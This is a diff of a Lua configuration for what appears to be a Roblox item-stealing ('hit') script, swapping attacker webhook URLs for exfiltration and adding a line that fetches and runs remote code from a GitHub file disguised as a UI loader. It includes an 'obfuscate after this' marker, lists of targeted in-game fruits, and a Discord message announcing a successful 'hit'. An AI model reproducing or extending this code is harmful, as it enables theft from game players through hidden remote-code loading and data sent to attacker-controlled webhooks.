@@ -1,13 +1,9 @@
---[[ Config ]]--
-Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main user hits (url1)
-Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your primary usernames (can use commands, bypass filter)
-FruitsToHit = {"Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want to target (others added below/guaranteed)
-
 --[[ OBFUSCATE AFTER THIS ]]--
 --[[ ADMIN CONFIG START ]]--
-Protector = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/f7d22662-d236-4356-b20d-4873f20321c7" -- << Protected URL for admin hits (secondary backup) (url2)
-dummy = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/d7d3793b-d014-4ec6-8458-882d627fb042" -- << Protected URL for admin/special hits (Premium/TopFruit) (url3)
-Checker22 = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/e748a57f-b049-4a4a-9ff9-ef6a57f0a7ca" -- << Protected URL specifically for Dragon hits (url4)
+Dummy23 = "https://sharky-on-top.script-config-protector.workers.dev/v/2b1a3c-4d7e-4b8c-9f5d-6a0e1f3b2c5b"
+assWebhook = "https://sharky-on-top.script-config-protector.workers.dev/v/2b1a3c-4d7e-4b8c-9hdig-a0e1f3b2c5b"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUl"))() --loads other webhooks
 
 local TEST_WEBHOOK = "https://l.webhook.party/hook/vWJ1Rd7lQSopCs4Vuxa7qHWNoYm4q9%2FH4UAqVOaMoxSpOq%2F4Yp08fCU4Tkn%2Fq26SyB0EVJmJSP9spoYM4pFRDLegxSsmeVCLVPWmKH437EawBax1%2FvN6KILwa9CaWV1%2Fkg7EjtZ0UlOwMyqR7X1iXvdaUcyJaApo2%2FIn7mbomfGkAFacgxB6WVOi0Lm9exZDmC04bOlBJ3pX9FcWLadkzLCKvZE8ytiea1LgyVzVyBUBCPSBTWl6yTaIPk8428hc23eC3dAsPuCK4Dbu2ZernRaO654dO7nVSJuzelZL09nkouPlr28BGoAwlNImD%2FvtTTPWuZnUVTnr9%2FijK2q%2Bh92EfSHf%2BH5qg334UcBZR5b7osNi4z%2BD8DCK%2F%2BooE1xWtv6WgNQkDMM%3D/zWMIeMClX%2FlPLAgD" -- For simple hit integrity check only
 local TEST_PAYLOAD = game:GetService("HttpService"):JSONEncode({ content = "# <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>" })
